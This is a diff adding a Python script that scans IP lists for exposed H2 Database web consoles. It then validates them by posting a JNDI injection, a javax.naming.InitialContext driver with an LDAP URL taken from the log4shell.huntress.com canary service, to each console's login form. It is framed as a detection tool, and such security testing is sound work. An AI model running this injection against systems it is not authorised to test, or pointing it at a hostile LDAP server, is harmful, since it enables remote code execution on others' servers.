@@ -1,0 +1,255 @@
+import requests
+from bs4 import BeautifulSoup
+import time
+from sys import argv
+import json
+import csv
+import os
+import argparse
+import sys
+
+start = time.perf_counter()
+print("[+] Start \n" +"="*50 )
+StartTime = time.strftime("%H:%M:%S")
+print(f"StartTime : %s " %(StartTime))
+
+# results to output file
+def outfile(i, mode="a+", time = time.strftime("%d_%H%M%S")):
+    #time = time.strftime("%d_%H%M%S")
+    filename = f"outfile_{str(time)}.txt"
+    file = open(filename, mode)
+    file.write(str(i)+"\n")
+    file.close()
+
+def detect_h2(ip,ports = 8082):
+    URL = f"http://{ip}:{ports}/"
+    print("input url", URL)
+
+    try:
+        r1 = requests.get(URL, allow_redirects = True)
+        r1.close()
+        #print(dir(r1), "\n")
+        out_html = r1.text # response
+        r_url = r1.url ## request url
+        # beautifulsoup
+        b1 = BeautifulSoup(out_html, "html.parser")
+        search = "Sorry, remote connections ('webAllowOthers') are disabled on this server."
+
+        ## Checking if h2 web console supports remote connection
+        if b1.head.title.text.strip() == "H2 Console" and b1.p != None and b1.p.text.strip() == search:
+            print(f"[-] h2 console {r1.url} but", b1.p.text.strip() )
+
+        elif b1.head.title.text.strip() == "H2 Console" and b1.h2 == None or b1.h2.text == "No Javascript":
+            #if len(key2) < 10
+            outfile(f" {r1.url}", "a")
+            print(f"[+] h2 Console detected on {r1.url}, further validation is required.")
+            return str(ip)
+        else:
+            print(f"[-] No h2 console detected.")
+
+    except requests.ConnectionError:
+        print("[-] Error Connection Refused")
+        print(f"[-] No h2 console detected on {URL}.")
+
+    # except AttributeError:
+    #     print("[-]AttributeError")
+    #     return "None Attribute Error"
+    # except:
+    #     return "Some exception occured."
+
+## generating ip list from a file
+def ip_list(filename):
+    with open(filename, "r") as list:
+        IPs = list.readlines()
+    return IPs
+
+def filename1(name="IP.txt"):
+    filename = "IP.txt"
+    if len(argv) > 1:
+        filename = argv[1]
+    return filename
+
+def filename(name="IP.txt"):
+    try:
+        filename = "IP.txt"
+        if len(argv) > 1:
+            filename = argv[1]
+            print("filename_:{filename}")
+        return filename
+    except FileNotFoundError:
+        print("[-] File not found, enter a valid file name")
+
+
+
+def request_h2(IP,ldap,PORT="8082",URI=""):
+    target = f"http://{IP}:{PORT}/{URI}"
+    proxyDict = {"http" : "http://127.0.0.1:8080"}
+    r_get = requests.get(target, timeout=3)
+    response = r_get.text
+    # index_start = 
+    cut1 = response[response.find("jsession"):]
+    # print(f"cut1 : {cut1}")
+    index_end = cut1.find(";")
+    jsession = cut1[:index_end-1]
+    # print(f"jsession: {jsession}")
+    # b1 = BeautifulSoup(r1.text, "html.parser")
+    # print(f"b1 body : {b1.head.script}")
+    # print(f"r1 body : {r1.content}")
+    # http proxy
+    proxyDict = {
+        "http"  : "http://127.0.0.1:8080"
+        }
+
+    header = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
+        'Content-Type': 'application/x-www-form-urlencoded'   }
+
+    obj = {    
+    'language':'en',
+    'setting':'Generic+Teradata',
+    'name':'Generic+Teradata',
+    'driver':'javax.naming.InitialContext',
+    'url':ldap,
+    'user':'',
+    'password':''
+    }
+    
+    target_2 = target+"login.do?"+jsession
+    r_post = requests.post(target_2,data=obj,headers=header,timeout=3 )
+    return r_post
+
+
+def get_huntress():
+    r_huntress = requests.get("https://log4shell.huntress.com/")
+    r_huntress.close()
+    bs_huntress = BeautifulSoup(r_huntress.content, "html.parser")
+    # r.text
+    # jndi_fetch = bs_huntress.pre.text
+    jndi_all = bs_huntress.find_all("pre")
+    j1 = jndi_all[1].text
+    i3 = j1.find('ldap')
+    # ldap_fetch = j1[i3:-1].replace("${env:","{").replace("HOSTNAME",f"{HOSTNAME}")
+    ldap_fetch = j1[i3:-1].replace("${env:","{")    
+    huntress_id = ldap_fetch[ldap_fetch.rfind('/'):]
+    return ldap_fetch, huntress_id
+
+def get_huntress_status(ID):
+    try:
+        huntress_status_json = "https://log4shell.huntress.com/json"+ID
+        results = requests.get(huntress_status_json)
+        json1 = results.json()
+        filename = f"output_json_{time.strftime('%H%M%S')}.json"
+        file = open(filename ,"a+")
+        file.write(str(json1))
+        file.close()
+        pretty_json = json.dumps(json1, sort_keys=True, indent =4)
+        out_json_file = json.loads(pretty_json)['hits']
+        if len(out_json_file) <= 0 :
+            print(f"No results from huntress, no hits on huntress endpoint.")
+        else:
+            print(f"Saving the output at {os.getcwd()}\\{filename} ")
+        # json to csv - written to file
+        filename_csv = f"outfile_csv_{time.strftime('%H%M%S')}.csv" 
+        with open(filename_csv,'w') as f:
+            wr = csv.DictWriter(f, fieldnames=out_json_file[0].keys())
+            wr.writeheader()
+            wr.writerows(out_json_file)
+        print(f"Saving the output at {os.getcwd()}\\{filename_csv} ")
+        return pretty_json
+    except IndexError:
+        print("Inded Error, no hits from huntress.com, Try again.")
+    except:
+        print("[-] Error fetching status from huntress.")
+
+
+if __name__ == "__main__":
+    # filename
+    filename = filename()
+    # filename = "IP.txt"
+    IPs = ip_list(filename)
+    # generating  IP list from 
+    if IPs == []:
+        print(f"[-] No IPs found the input file is empty. Add IPs to the file")
+    else:
+        print(f"Input IP list : {IPs}")
+    #print(f"Input IP list : {IPs}")
+    print(f"="*50 )
+
+    # output list
+    outlist = []
+    for i in IPs:
+        print(i.strip())
+        try:
+            x = detect_h2(i.strip())
+            if x != None:
+                outlist.append(x)
+        except KeyboardInterrupt:
+            print("Intrrupted")
+            sys.exit()
+        except requests.ConnectionError:
+            print(f"[-] Connection Error {i.strip()}")
+        print(f"-"*50 )
+
+    print(f"[+] IPs with h2 console : {outlist}")
+    print(f"-"*50 )
+
+    # Manual test
+    # IP = "192.168.10.1"
+    # detect_h2(IP)
+
+    print("[+] Starting JNDI injection with the ldap from huntress.com ...")
+    print("     [#] For more info visit https://log4shell.huntress.com/ ")
+
+    # IPs = ["192.168.10.11", "192.168.10.14", "193.206.59.85", "3.21.163.236"]
+    # IPs = outlist
+    
+    ldap_url, huntress_id = get_huntress()
+    print(f"[+] Fetching ldap URL: {ldap_url} \n&\nHuntress ID : {huntress_id}")
+    
+    for IP in IPs:
+        try:
+            HOSTNAME = IP.strip()
+            # print(HOSTNAME)
+            ldap = ldap_url.replace("HOSTNAME",f"{HOSTNAME}")
+            # print(ldap)
+            post = request_h2(HOSTNAME, ldap , "8082")
+        except requests.ConnectionError:
+            print(f"{IP.strip()} Error Connecting ...")
+        except IndexError:
+            print(f"Empty list.")
+            
+    # post = request_h2(HOSTNAME, ldap_url, "8082")
+    print("="*50)
+    # print(f"[+] Testing {post.url}")
+    print(f"[+] Check Result at (huntress) ::","https://log4shell.huntress.com/view/"+ldap_url[ldap_url.rfind('/')+1:])
+    print("     [#] FYI https://log4shell.huntress.com/ only stores results temporarily for 30min, you can refer to the data is saved locally ")
+    print("="*50)
+    status_json = get_huntress_status(huntress_id)
+    print("[+] Output", status_json)       
+    print("="*50)
+    # print("[+] The End.")
+## timer/counter
+finish = time.perf_counter()
+print(f"[+]Script time (sec) : {round(finish-start )}")
+EndTime = time.strftime("%H:%M:%S")
+print(f"End Time : %s " %(EndTime))
+print(f"="*50 )
+print("[+] The End")
+
+# Reference: other options
+# nmap -sV --script http-title --script-args "http-title.url=/" -p80,443,8000-9000 192.168.0.0/8 | grep "H2 Console"
+# https://jfrog.com/blog/the-jndi-strikes-back-unauthenticated-rce-in-h2-database-console/
+
+### About The Script
+# The script detect H2 server for the give list of IPs,
+# it can identify the H2 Console web pages and check for access restrictions.
+# Detections h2 web console pages and checks console accessibility.
+# Added Support for validation by injecting a ldap server url to trigger JNDI requests,
+# log4shell.huntress.com ldap server is used here for this validation and the
+# results are fetched from the server and saved locally json and csv filetypes
+###
+
+# Script Version : v0.3.6
+# By Vivek Gopal
+# Security Analyst
+# Cybersecurityworks
